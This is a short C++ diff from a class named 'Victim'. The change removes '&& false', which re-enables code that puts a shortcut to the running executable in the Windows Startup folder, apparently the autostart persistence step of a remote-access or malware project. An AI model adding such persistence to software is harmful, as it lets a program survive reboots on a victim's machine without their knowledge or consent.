@@ -30,7 +30,7 @@ Victim::Victim()
     readFile.close();
 
     PWSTR start;
-    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start)) && false) {
+    if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_Startup, 0, NULL, &start))) {
         std::wstring lnkPath = std::wstring(start) + L"\\" + std::wstring(exeName.begin(), exeName.end()) + L".lnk";
         //free the allocated memory
         CoTaskMemFree(start);
